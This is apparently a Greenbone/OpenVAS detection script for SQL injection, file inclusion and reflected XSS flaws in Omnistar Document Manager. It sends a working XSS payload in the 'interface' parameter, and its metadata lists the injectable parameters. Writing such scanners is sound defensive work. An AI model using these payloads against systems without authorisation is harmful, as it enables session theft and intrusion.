if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.802467" );
	script_version( "2020-08-24T15:18:35+0000" );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_tag( name: "last_modification", value: "2020-08-24 15:18:35 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2012-10-11 13:29:47 +0530 (Thu, 11 Oct 2012)" );
	script_name( "Omnistar Document Manager Software Multiple Vulnerabilities" );
	script_xref( name: "URL", value: "http://seclists.org/bugtraq/2012/Oct/65" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/archive/1/524380" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2012 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "find_service.sc", "no404.sc", "webmirror.sc", "DDI_Directory_Scanner.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 443 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_tag( name: "insight", value: "- Multiple sql bugs are located in index.php file with the bound
  vulnerable report_id, delete_id, add_id, return_to, interface, page and sort_order
  parameter requests.

  - The LFI bug is located in the index module with the bound vulnerable 'area'
  parameter request.

  - Multiple non stored XSS bugs are located in the interface exception-handling
  module of the application with the client side  bound vulnerable interface,
  act, name and alert_msg parameter requests." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the disclosure of this vulnerability.
Likely none will be provided anymore.
General solution options are to upgrade to a newer release, disable respective features, remove the product or replace the product by another one." );
	script_tag( name: "summary", value: "This host is running Omnistar Document Manager Software and is
  prone multiple SQL vulnerabilities." );
	script_tag( name: "impact", value: "Successful exploitation will allow remote attackers to compromise
  dbms via sql injection or information disclosure via local system file include
  and hijack administrator/moderator/customer sessions via persistent malicious
  script code inject on application side" );
	script_tag( name: "affected", value: "Omnistar Document Manager Version 8.0 and prior" );
	script_tag( name: "qod_type", value: "remote_app" );
	script_tag( name: "solution_type", value: "WillNotFix" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("list_array_func.inc.sc");
port = http_get_port( default: 443 );
if(!http_can_host_php( port: port )){
	exit( 0 );
}
for dir in nasl_make_list_unique( "/", "/dm", "/dms", http_cgi_dirs( port: port ) ) {
	if(dir == "/"){
		dir = "";
	}
	res = http_get_cache( item: dir + "/index.php", port: port );
	if(res && ContainsString( res, ">Document Management Software<" )){
		url = dir + "/index.php?interface=><script>alert(document.cookie)" + ";</script>";
		req = http_get( item: url, port: port );
		res = http_keepalive_send_recv( port: port, data: req );
		if(IsMatchRegexp( res, "^HTTP/1\\.[01] 200" ) && res && ContainsString( res, "><script>alert(document.cookie);</script>" ) && ContainsString( res, ">Interface Name:<" )){
			security_message( port: port );
			exit( 0 );
		}
	}
}
exit( 99 );

